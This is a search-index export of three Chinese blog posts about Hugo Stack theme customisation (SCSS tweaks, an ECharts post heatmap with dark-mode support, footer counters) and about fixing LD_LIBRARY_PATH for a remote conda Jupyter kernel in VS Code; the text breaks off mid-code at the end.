[{"content":"导语 复现论文的时候需要特定的版本的cuda、torch、pyG，同时希望使用jupyternotebook来记录复现的过程，把我遇到的坑在这里总结一下。\n插件 ssh：直接用ssh插件\npython：直接用python插件\njupynotebook：直接用jupyter插件\n操作 在服务器上安装ipykernel就可以，在vscode打开ipynb的文件的时候，右上角就可以选择对应的内核\n坑 其实直接用上面的方法就可以获取相对合理的远程环境使用体验了，但是如果你用了pyG（也就是torch_geometric）并且依赖某个特定版本的cuda，而这个版本的cuda是使用conda环境装的的话，会因为LD_LIBRARY_PATH没用被引入而一直用不了，提示\n1 OSError: libcusparse.so.xx: cannot open shared object file: No such file or directory 这时候就要在服务器上的对应的conda环境里，使用这个命令\n1 python -m ipykernel install --user --name flash --display-name \u0026#34;flash\u0026#34; 来将这个环境的内核注册到jupyternotebook里，同时使用\n1 export LD_LIBRARY_PATH=/home/ubuntu/anaconda3/envs/flash/lib:$LD_LIBRARY_PATH 将这个lib引入，接下来使用\n1 jupyter-notebook --port 9999 来启动一个jupyter server，会有对应的地址\n然后再用vscode连接到服务器，打开对应的ipynb，右上角会有选择内核，选择其他内核-现有jupyter服务器输入刚才的url\n在这里你就可以看到你要的环境了。\n后记 感觉大模型的幻觉还是挺严重的，还是说只有我遇到了这个问题啊？我按着大模型给我的方法用ipynb的魔术方法引入对应的.so，打印环境变量有，但是代码还是跑不了，搞得我很烦，一番折腾终于搞成了。\n","date":"2024-10-08T16:37:46+08:00","image":"http://localhost:1313/p/vs%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84conda%E7%9A%84jupynotebook/index/1728377258643_hu2298737273471479737.png","permalink":"http://localhost:1313/p/vs%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84conda%E7%9A%84jupynotebook/","title":"VS连接远程服务器的conda的jupynotebook"},{"content":"导语 水一篇！\n看了https://yelleis.top/p/hugo-theme-stack-beautification-2/的stack添加热力图，实装后发现和我的高对比度暗色主题巨不适配，遂改之。\n操作 先搞清楚stack这个明暗主题切换的原理，在 \\assets\\ts\\main.ts里，有\n1 new StackColorScheme(document.getElementById(\u0026#39;dark-mode-toggle\u0026#39;)); 追踪看到在 \\assets\\ts\\colorScheme.ts里有\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 constructor(toggleEl: HTMLElement) { this.bindMatchMedia(); this.currentScheme = this.getSavedScheme(); this.dispatchEvent(document.documentElement.dataset.scheme as colorScheme); if (toggleEl) this.bindClick(toggleEl); if (document.body.style.transition == \u0026#39;\u0026#39;) document.body.style.setProperty(\u0026#39;transition\u0026#39;, \u0026#39;background-color .3s ease\u0026#39;); } private saveScheme() { localStorage.setItem(this.localStorageKey, this.currentScheme); } private bindClick(toggleEl: HTMLElement) { toggleEl.addEventListener(\u0026#39;click\u0026#39;, (e) =\u0026gt; { if (this.isDark()) { /// Disable dark mode this.currentScheme = \u0026#39;light\u0026#39;; } else { this.currentScheme = \u0026#39;dark\u0026#39;; } this.setBodyClass(); if (this.currentScheme == this.systemPreferScheme) { /// Set to auto this.currentScheme = \u0026#39;auto\u0026#39;; } this.saveScheme(); }) } 会在 getElementById('dark-mode-toggle') onclick的时候把scheme存在localstorage里，首先的想法是直接监听 dark-mode-toggle的onclick，但是还是要存scheme，于是在这里存saveScheme里直接抛出一个事件 window.dispatchEvent(newEvent('colorSchemeChange'));\n1 2 3 4 private saveScheme() { localStorage.setItem(this.localStorageKey, this.currentScheme); window.dispatchEvent(new Event(\u0026#39;colorSchemeChange\u0026#39;)); // through event } 再在heatmap.html里用js监听这个事件， 一旦事件发生就执行更新heatmap样式的函数\n再利用echarts.min.js对应的颜色设置，把之前的代码重构了哈，需要的话直接在genOption里改颜色即可。我这个的效果可以直接在我的主页看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 \u0026lt;div id=\u0026#34;heatmap\u0026#34; style=\u0026#34; max-width: 1900px; height: 180px; padding: 2px; text-align: center; \u0026#34; \u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/echarts@5.3.0/dist/echarts.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var chartDom = document.getElementById(\u0026#39;heatmap\u0026#39;); var myChart = echarts.init(chartDom); window.onresize = function() { myChart.resize(); }; // 生成颜色的option function genOption(){ var option; const colorSchemeItem = localStorage.getItem(\u0026#39;StackColorScheme\u0026#39;); // 可以获取到当前主题模式，但是我需要的是变了主题模式自动切换 if (colorSchemeItem == \u0026#39;light\u0026#39;) { var color_t = [\u0026#39;#a8e4a0\u0026#39;, \u0026#39;#7aa874\u0026#39;, \u0026#39;#4e8a4c\u0026#39;,\u0026#39;#2c5f2d\u0026#39; ]; // 写的多和少颜色的深度，light是绿色调 var color_font = \u0026#39;#000\u0026#39;; // 日期、月份的颜色，light是黑色 var color_cube = \u0026#39;#f1f1f1\u0026#39;; // 空方块颜色，light是灰色 var color_title = \u0026#39;#000\u0026#39;; // 标题颜色，light是黑色 var color_border = \u0026#39;#fff\u0026#39;; // 边框颜色，light是白色 var color_split_month = \u0026#39;rgba(0, 0, 0, 0.0)\u0026#39;; // 月份之间的分割线颜色，light是透明，想改的话可以改 } else { var color_t = [\u0026#39;#fbb1d9\u0026#39;, \u0026#39;#f770d4\u0026#39;, \u0026#39;#d94bbf\u0026#39;, \u0026#39;#a734a2\u0026#39; ]; // 写的多和少颜色的深度，dark是粉色调 var color_font = \u0026#39;#fff\u0026#39;; // 日期、月份的颜色，dark是白色 var color_cube = \u0026#39;#121212\u0026#39;; // 空方块颜色，dark是深灰色 var color_title = \u0026#39;#fff\u0026#39;; // 标题颜色，dark是白色 var color_border = \u0026#39;#000\u0026#39;; // 边框颜色，dark是黑色 var color_split_month = \u0026#39;rgba(0, 0, 0, 0.0)\u0026#39;; // 月份之间的分割线颜色，dark也是透明，想改的话可以改 } option = { title: { top: 0, left: \u0026#39;center\u0026#39;, text: \u0026#39;博客热力图\u0026#39;, textStyle: { color: color_title, fontSize: 20, } }, tooltip: { hideDelay: 1000, enterable: true, formatter: function (p) { const date = p.data[0]; const posts = dataMap.get(date); var content = `${date}`; for (const [i, post] of posts.entries()) { content += \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; var link = post.link; var title = post.title; var wordCount = (post.wordCount / 1000).toFixed(1); content += `\u0026lt;a href=\u0026#34;${link}\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;${title} | ${wordCount} k\u0026lt;/a\u0026gt;` } return content; } }, visualMap: { min: 0, max: 10, type: \u0026#39;piecewise\u0026#39;, orient: \u0026#39;horizontal\u0026#39;, left: \u0026#39;center\u0026#39;, top: 30, inRange: { // [floor color, ceiling color] color: color_t, }, splitNumber: 4, text: [\u0026#39;千字\u0026#39;, \u0026#39;\u0026#39;], showLabel: true, itemGap: 20, textStyle: { color: color_font, } }, calendar: { top: 80, left: 20, right: 4, cellSize: [\u0026#39;auto\u0026#39;, 13], range: getRangeArr(), itemStyle: { color: color_cube, borderWidth: 1.5, borderColor: color_border, }, monthLabel: { color: color_font }, dayLabel: { color: color_font }, yearLabel: { show: false }, // the splitline between months. set to transparent for now. splitLine: { lineStyle: { color: \u0026#39;rgba(0, 0, 0, 0.0)\u0026#39;, // shadowColor: \u0026#39;rgba(0, 0, 0, 0.5)\u0026#39;, // shadowBlur: 5, // width: 0.5, // type: \u0026#39;dashed\u0026#39;, } } }, series: { type: \u0026#39;heatmap\u0026#39;, coordinateSystem: \u0026#39;calendar\u0026#39;, data: data, } }; return option; } // echart heatmap data seems to only support two elements tuple // it doesn\u0026#39;t render when each item has 3 value // it also only pass first 2 elements when reading event param // so here we build a map to store additional metadata like link and title // map format {date: [{wordcount, link, title}]} // for more information see https://blog.douchi.space/hugo-blog-heatmap var dataMap = new Map(); {{ range ((where .Site.RegularPages \u0026#34;Type\u0026#34; \u0026#34;post\u0026#34;)) }} var key = {{ .Date.Format \u0026#34;2006-01-02\u0026#34; }}; var value = dataMap.get(key); var wordCount = {{ .WordCount }}; var link = {{ .RelPermalink}}; var title = {{ .Title }}; // multiple posts in same day if (value == null) { dataMap.set(key, [{wordCount, link, title}]); } else { value.push({wordCount, link, title}); } {{- end -}} var data = []; // sum up the word count for (const [key, value] of dataMap.entries()) { var sum = 0; for (const v of value) { sum += v.wordCount; } data.push([key, (sum / 1000).toFixed(1)]); } var startDate = new Date(); var year_Mill = startDate.setFullYear((startDate.getFullYear() - 1)); var startDate = +new Date(year_Mill); var endDate = +new Date(); var dayTime = 3600 * 24 * 1000; startDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, startDate); endDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, endDate); // change date range according to months we want to render function heatmap_width(months){ var startDate = new Date(); var mill = startDate.setMonth((startDate.getMonth() - months)); var endDate = +new Date(); startDate = +new Date(mill); endDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, endDate); startDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, startDate); var showmonth = []; showmonth.push([ startDate, endDate ]); return showmonth }; function getRangeArr() { const windowWidth = window.innerWidth; if (windowWidth \u0026gt;= 600) { return heatmap_width(12); } else if (windowWidth \u0026gt;= 400) { return heatmap_width(9); } else { return heatmap_width(6); } } var option = genOption(); myChart.setOption(option); myChart.on(\u0026#39;click\u0026#39;, function(params) { if (params.componentType === \u0026#39;series\u0026#39;) { // open the first post on the day const post = dataMap.get(params.data[0])[0]; const link = window.location.origin + post.link; window.open(link, \u0026#39;_blank\u0026#39;).focus(); } }); function updateChartColors() { option = genOption(); myChart.setOption(option); } window.addEventListener(\u0026#39;colorSchemeChange\u0026#39;, updateChartColors); \u0026lt;/script\u0026gt; 最后结果大概这样\n","date":"2024-09-05T00:15:06+08:00","image":"http://localhost:1313/p/hugostackheatmap%E6%98%8E%E6%9A%97%E4%B8%BB%E9%A2%98%E9%80%82%E9%85%8D/index/1725472577216_hu8472594742937719499.png","permalink":"http://localhost:1313/p/hugostackheatmap%E6%98%8E%E6%9A%97%E4%B8%BB%E9%A2%98%E9%80%82%E9%85%8D/","title":"HugoStackHeatmap明暗主题适配"},{"content":"导语 博客就是拿来装修的，发文其实不重要（？\n综述 我使用的是hugo stack博客，hugo博客有一个好处就是你可以将所有的更改放在博客根目录下，这会覆盖掉theme里对应的同名文件，同时很多主题（比如stack）支持以submodule的模式安装，所以就可以安心的更新主题，使用主题的最新特性了\n这篇装修主要参考了以下大佬们的教程，あぃがとう❣以下排名不分先后\nhttps://thirdshire.com/hugo-stack-renovation/\nHugo-theme-Stack 魔改美化 | Naive Koala (xalaok.top)\n给博客添加heatmap | Liminal Negative Space\nhttps://mogeko.me/zh-cn/posts/zh-cn/033/\n具体操作 custom.scss hugo的custom.scss是优先级最高的scss，其他所有的scss都会被他覆盖掉，这里我们通过修改css实现了\n各种棱角的磨圆，以及某些本来看着不够圆的磨得更圆 滚动条的美化 light模式和dark模式的色彩修改（还没改完，这玩意你自己看着改就行，不知道改哪个变量可以去 \\assets\\scss\\variables.scss找 修复引用块内容窄页面显示问题 文章内容图片圆角阴影 文章内容引用块样式 代码块基础样式修改以及highlight主题变更（其实没啥用，而且还挺麻烦，有后续步骤，觉得麻烦也可以不改） 设置选中字体的区域背景颜色 文章封面高度更改 全局页面布局间距调整 页面三栏宽度调整 全局页面小图片样式微调 归档页面双栏 链接三栏 头像旋转动画 在 assets\\scss\\custom.scss里写\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 // 全局滚动条美化 html { ::-webkit-scrollbar { width: 20px; } ::-webkit-scrollbar-track { background-color: transparent; } ::-webkit-scrollbar-thumb { background-color: #d6dee1; border-radius: 20px; border: 6px solid transparent; background-clip: content-box; } ::-webkit-scrollbar-thumb:hover { background-color: #a8bbbf; } } // 页面基本配色 :root { // 全局顶部边距 --main-top-padding: 30px; // 全局卡片圆角 --card-border-radius: 25px; // 标签云卡片圆角 --tag-border-radius: 8px; // 卡片间距 --section-separation: 40px; // 全局字体大小 --article-font-size: 1.8rem; --emphasize-text-color: #9e8f9f; // Add emphasize font color // // 行内代码背景色 // --code-background-color: #f8f8f8; // // 行内代码前景色 // --code-text-color: #e96900; // 暗色模式下样式 \u0026amp;[data-scheme=\u0026#34;dark\u0026#34;] { // 背景色 --body-background: #000000; // 滚动条按钮色 --scrollbar-thumb: #24242480; // 文章卡片背景色 --card-background: #121212; --emphasize-text-color: #d5cfc4; // Add emphasize font color for dark scheme } } //------------------------------------------------------ // 修复引用块内容窄页面显示问题 a { word-break: break-all; } code { word-break: break-all; } //--------------------------------------------------- // 文章内容图片圆角阴影 .article-page .main-article .article-content { img { max-width: 96% !important; height: auto !important; border-radius: 8px; } } //------------------------------------------------ // 文章内容引用块样式 .article-content { blockquote { border-left: 6px solid #358b9a1f !important; background: #3a97431f; } } // --------------------------------------- // 代码块基础样式修改 .highlight { max-width: 102% !important; background-color: var(--pre-background-color); padding: var(--card-padding); position: relative; border-radius: 20px; margin-left: -7px !important; margin-right: -12px; box-shadow: var(--shadow-l1) !important; \u0026amp;:hover { .copyCodeButton { opacity: 1; } } // keep Codeblocks LTR [dir=\u0026#34;rtl\u0026#34;] \u0026amp; { direction: ltr; } pre { margin: initial; padding: 0; margin: 0; width: auto; } } // light模式下的代码块样式调整 [data-scheme=\u0026#34;light\u0026#34;] .article-content .highlight { background-color: #fff; } [data-scheme=\u0026#34;light\u0026#34;] .chroma { // color: #ff6f00; background-color: #fff; } // dark模式下的代码块样式调整 [data-scheme=\u0026#34;dark\u0026#34;] .article-content .highlight { background-color: #1f1f24; } [data-scheme=\u0026#34;dark\u0026#34;] .chroma { // color: #ff6f00; background-color: #1f1f24; } //------------------------------------------- // 设置选中字体的区域背景颜色 //修改选中颜色 ::selection { color: #fff; background: #34495e; } a { text-decoration: none; color: var(--accent-color); \u0026amp;:hover { color: var(--accent-color-darker); } \u0026amp;.link { color: #4288b9ad; font-weight: 600; padding: 0 2px; text-decoration: none; cursor: pointer; \u0026amp;:hover { text-decoration: underline; } } } //------------------------------------------------- //文章封面高度更改 .article-list article .article-image img { width: 100%; height: 150px; object-fit: cover; @include respond(md) { height: 200px; } @include respond(xl) { height: 305px; } } //--------------------------------------------------- // 全局页面布局间距调整 .main-container { min-height: 100vh; align-items: flex-start; padding: 0 15px; gap: var(--section-separation); padding-top: var(--main-top-padding); @include respond(md) { padding: 0 37px; } } //-------------------------------------------------- //页面三栏宽度调整 .container { margin-left: auto; margin-right: auto; .left-sidebar { order: -3; max-width: var(--left-sidebar-max-width); } .right-sidebar { order: -1; max-width: var(--right-sidebar-max-width); /// Display right sidebar when min-width: lg @include respond(lg) { display: flex; } } \u0026amp;.extended { @include respond(md) { max-width: 1024px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 22% !important; } @include respond(lg) { max-width: 1280px; --left-sidebar-max-width: 20%; --right-sidebar-max-width: 30%; } @include respond(xl) { max-width: 1453px; //1536px; --left-sidebar-max-width: 15%; --right-sidebar-max-width: 25%; } } \u0026amp;.compact { @include respond(md) { --left-sidebar-max-width: 25%; max-width: 768px; } @include respond(lg) { max-width: 1024px; --left-sidebar-max-width: 20%; } @include respond(xl) { max-width: 1280px; } } } //------------------------------------------------------- //全局页面小图片样式微调 .article-list--compact article .article-image img { width: var(--image-size); height: var(--image-size); object-fit: cover; border-radius: 17%; } //------------------------------------------------ //将滚动条修改为圆角样式 //菜单滚动条美化 .menu::-webkit-scrollbar { display: none; } //-------------------------------------------------- //归档页面双栏 /* 归档页面两栏 */ @media (min-width: 1024px) { .article-list--compact { display: grid; grid-template-columns: 1fr 1fr; background: none; box-shadow: none; gap: 1rem; article { background: var(--card-background); border: none; box-shadow: var(--shadow-l2); margin-bottom: 8px; border-radius: 16px; } } } //-------------------------------------------------- //链接三栏 @media (min-width: 1024px) { .article-list--compact.links { display: grid; grid-template-columns: 1fr 1fr 1fr; //三个1fr即为三栏,两个1fr则为双栏,以此类推即可. background: none; box-shadow: none; gap: 1rem; article { background: var(--card-background); border: none; box-shadow: var(--shadow-l2); margin-bottom: 8px; border-radius: var(--card-border-radius); \u0026amp;:nth-child(odd) { margin-right: 8px; } } } } .article-list--tile article { transition: .6s ease; } .article-list--tile article:hover { transform: scale(1.03, 1.03); } .article-content { .highlight:before { content: \u0026#39;\u0026#39;; display: block; background: url(/code-header.svg); height: 32px; width: 100%; background-size: 57px; background-repeat: no-repeat; margin-bottom: 5px; background-position: -1px 2px; } } // 头像旋转动画 .sidebar header .site-avatar .site-logo { transition: transform 1.65s ease-in-out; // 旋转时间 } .sidebar header .site-avatar .site-logo:hover { transform: rotate(360deg); // 旋转角度为360度 } 设置不同的highlight hugo使用的marker自带一个highlight的插件，但是只能全局适用，就是说light和dark都是一个highlight，stack自己设置了白天夜里两套highlight，在 assets\\scss\\partials\\highlight里\n使用 hugo gen chromastyles --style=xcode-dark \u0026gt; syntax.css可以生成Chroma Style Gallery (xyproto.github.io)中对应的highlight的css，直接把对应的改成light.scss和dark.scss即可，然后再把common.scss的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 .chroma .lntd { vertical-align: top; padding: 0; margin: 0; border: 0; } /* LineTable */ .chroma .lntable { border-spacing: 0; padding: 0; margin: 0; border: 0; width: 100%; display: block; \u0026gt; tbody { display: block; width: 100%; \u0026gt; tr { display: flex; width: 100%; \u0026gt; td:last-child { overflow-x: auto; } } } } 这一部分复制过来保存为scss。然后由于可能报看，还要在 custom.scss里应用这些调整来让代码块看着好看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // light模式下的代码块样式调整 [data-scheme=\u0026#34;light\u0026#34;] .article-content .highlight { background-color: #fff; } [data-scheme=\u0026#34;light\u0026#34;] .chroma { // color: #ff6f00; background-color: #fff; } // dark模式下的代码块样式调整 [data-scheme=\u0026#34;dark\u0026#34;] .article-content .highlight { background-color: #1f1f24; } [data-scheme=\u0026#34;dark\u0026#34;] .chroma { // color: #ff6f00; background-color: #1f1f24; } 我调的xcode的highlight大概长这样\n只能说见仁见智了，我觉得其实不调也没啥，要再个性化的话可能就有点工作量太大了\n字数统计 在 layouts/partials/footer/footer.html中增加\n1 2 3 4 5 6 7 8 9 \u0026lt;!-- Add total page and word count time --\u0026gt; \u0026lt;section class=\u0026#34;totalcount\u0026#34;\u0026gt; {{$scratch := newScratch}} {{ range (where .Site.Pages \u0026#34;Kind\u0026#34; \u0026#34;page\u0026#34; )}} {{$scratch.Add \u0026#34;total\u0026#34; .WordCount}} {{ end }} 发表了{{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;post\u0026#34;) }}篇文章 · 总计{{ div ($scratch.Get \u0026#34;total\u0026#34;) 1000.0 | lang.FormatNumber 2 }}k字 \u0026lt;/section\u0026gt; 注意如果你是用zh-cn ja ko语言，需要在config.yaml里设置 hasCJKLanguage:true，否则只会按照英文单词那样以空格分来统计\n在 assets/scss/partials/footer.scss里增加\n1 2 3 4 5 .totalcount { color: var(--card-text-color-secondary); font-weight: normal; margin-bottom: 5px; } 统计运行时间 在 layouts/partials/footer/custom.html里添加\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!-- Add blog running time --\u0026gt; \u0026lt;script\u0026gt; let s1 = \u0026#39;2023-3-18\u0026#39;; //website start date s1 = new Date(s1.replace(/-/g, \u0026#34;/\u0026#34;)); let s2 = new Date(); let timeDifference = s2.getTime() - s1.getTime(); let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24)); let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)); let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60)); let result = days + \u0026#34;天\u0026#34; + hours + \u0026#34;小时\u0026#34; + minutes + \u0026#34;分钟\u0026#34;; document.getElementById(\u0026#39;runningdays\u0026#39;).innerHTML = result; \u0026lt;/script\u0026gt; 然后再在 layouts/partials/footer/footer.html 里添加\n1 2 3 4 5 \u0026lt;!-- Add blog running time --\u0026gt; \u0026lt;section class=\u0026#34;running-time\u0026#34;\u0026gt; 本博客已稳定运行 \u0026lt;span id=\u0026#34;runningdays\u0026#34; class=\u0026#34;running-days\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/section\u0026gt; 在 assets/scss/partials/footer.scss里添加\n1 2 3 4 5 6 7 8 9 .running-time { color: var(--card-text-color-secondary); font-weight: normal; .running-days { font-weight:bold; color: var(--emphasize-text-color); } } 然后在variable.scss的 :root里加light和dark模式下的\u0026ndash;emphasize-text-color的值\n1 --emphasize-text-color: #9e8f9f; 当然也可以在custom.scss里加，我在custom.scss里加了，你可以ctrl+F搜拿来参考。\n自定义菜单 stack主题可以自定义菜单，他提供了两种方法，一种是在 config.yaml里添加\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 menu: # main: # - name: 课程 # url: /post/class # weight: 1 # params: # icon: book-2 # - name: 论文 # url: /post/thesis # weight: 2 # params: # icon: school # - name: 技术 # url: /post/tech # weight: 3 # params: # icon: device-desktop # - name: 杂项 # url: /post/misc # weight: 4 # params: # icon: topology-star-3 这样的设置，但是会出现选中的时候不高亮的问题，但是第二个可以高亮这个应该就可以高亮，只能说bug没修\n第二种方式是在content/post里的_index.md的开头写，类似这样\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title:\u0026#34;👨🏻‍💻技术\u0026#34; description:\u0026#34;一些我感兴趣的学科相关的技术\u0026#34; menu: main: name:\u0026#34;技术\u0026#34; weight:3 params: icon:device-desktop 这里icon要放在 assets\\icons下，我建议在https://tabler-icons.io/里找对于的svg，这样整体风格是一致的\nheatmap 在 layouts\\shortcodes和 \\layouts\\partials里添加一个heatmap.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 \u0026lt;div id=\u0026#34;heatmap\u0026#34; style=\u0026#34; max-width: 1900px; height: 180px; padding: 2px; text-align: center; \u0026#34; \u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/echarts@5.3.0/dist/echarts.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var chartDom = document.getElementById(\u0026#39;heatmap\u0026#39;); var myChart = echarts.init(chartDom); window.onresize = function() { myChart.resize(); }; var option; // echart heatmap data seems to only support two elements tuple // it doesn\u0026#39;t render when each item has 3 value // it also only pass first 2 elements when reading event param // so here we build a map to store additional metadata like link and title // map format {date: [{wordcount, link, title}]} // for more information see https://blog.douchi.space/hugo-blog-heatmap var dataMap = new Map(); {{ range ((where .Site.RegularPages \u0026#34;Type\u0026#34; \u0026#34;post\u0026#34;)) }} var key = {{ .Date.Format \u0026#34;2006-01-02\u0026#34; }}; var value = dataMap.get(key); var wordCount = {{ .WordCount }}; var link = {{ .RelPermalink}}; var title = {{ .Title }}; // multiple posts in same day if (value == null) { dataMap.set(key, [{wordCount, link, title}]); } else { value.push({wordCount, link, title}); } {{- end -}} var data = []; // sum up the word count for (const [key, value] of dataMap.entries()) { var sum = 0; for (const v of value) { sum += v.wordCount; } data.push([key, (sum / 1000).toFixed(1)]); } var startDate = new Date(); var year_Mill = startDate.setFullYear((startDate.getFullYear() - 1)); var startDate = +new Date(year_Mill); var endDate = +new Date(); var dayTime = 3600 * 24 * 1000; startDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, startDate); endDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, endDate); // change date range according to months we want to render function heatmap_width(months){ var startDate = new Date(); var mill = startDate.setMonth((startDate.getMonth() - months)); var endDate = +new Date(); startDate = +new Date(mill); endDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, endDate); startDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, startDate); var showmonth = []; showmonth.push([ startDate, endDate ]); return showmonth }; function getRangeArr() { const windowWidth = window.innerWidth; if (windowWidth \u0026gt;= 600) { return heatmap_width(12); } else if (windowWidth \u0026gt;= 400) { return heatmap_width(9); } else { return heatmap_width(6); } } option = { title: { top: 0, left: \u0026#39;center\u0026#39;, text: \u0026#39;博客热力图\u0026#39; }, tooltip: { hideDelay: 1000, enterable: true, formatter: function (p) { const date = p.data[0]; const posts = dataMap.get(date); var content = `${date}`; for (const [i, post] of posts.entries()) { content += \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; var link = post.link; var title = post.title; var wordCount = (post.wordCount / 1000).toFixed(1); content += `\u0026lt;a href=\u0026#34;${link}\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;${title} | ${wordCount} k\u0026lt;/a\u0026gt;` } return content; } }, visualMap: { min: 0, max: 10, type: \u0026#39;piecewise\u0026#39;, orient: \u0026#39;horizontal\u0026#39;, left: \u0026#39;center\u0026#39;, top: 30, inRange: { // [floor color, ceiling color] color: [\u0026#39;#7aa8744c\u0026#39;, \u0026#39;#7AA874\u0026#39; ] }, splitNumber: 4, text: [\u0026#39;千字\u0026#39;, \u0026#39;\u0026#39;], showLabel: true, itemGap: 20, }, calendar: { top: 80, left: 20, right: 4, cellSize: [\u0026#39;auto\u0026#39;, 13], range: getRangeArr(), itemStyle: { color: \u0026#39;#F1F1F1\u0026#39;, borderWidth: 1.5, borderColor: \u0026#39;#fff\u0026#39;, }, yearLabel: { show: false }, // the splitline between months. set to transparent for now. splitLine: { lineStyle: { color: \u0026#39;rgba(0, 0, 0, 0.0)\u0026#39;, // shadowColor: \u0026#39;rgba(0, 0, 0, 0.5)\u0026#39;, // shadowBlur: 5, // width: 0.5, // type: \u0026#39;dashed\u0026#39;, } } }, series: { type: \u0026#39;heatmap\u0026#39;, coordinateSystem: \u0026#39;calendar\u0026#39;, data: data, } }; myChart.setOption(option); myChart.on(\u0026#39;click\u0026#39;, function(params) { if (params.componentType === \u0026#39;series\u0026#39;) { // open the first post on the day const post = dataMap.get(params.data[0])[0]; const link = window.location.origin + post.link; window.open(link, \u0026#39;_blank\u0026#39;).focus(); } }); \u0026lt;/script\u0026gt; 如果在html模板中使用，就在要用的位置写 {{ partial \u0026quot;heatmap\u0026quot; . }}\n如果在Markdown里用，在要用的位置写\n1 {{/* heatmap */}} 大概长这样\n好像对暗色模式的适配不是很好，之后看看怎么改毕比较合理。\n更新：优化完毕~\n取消相关推荐的图片的奇怪的彩色阴影 把 \\assets\\ts\\main.ts的第9行\n1 // import { getColor } from \u0026#39;ts/color\u0026#39;; 和33到59行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // const articleTile = document.querySelector(\u0026#39;.article-list--tile\u0026#39;); // 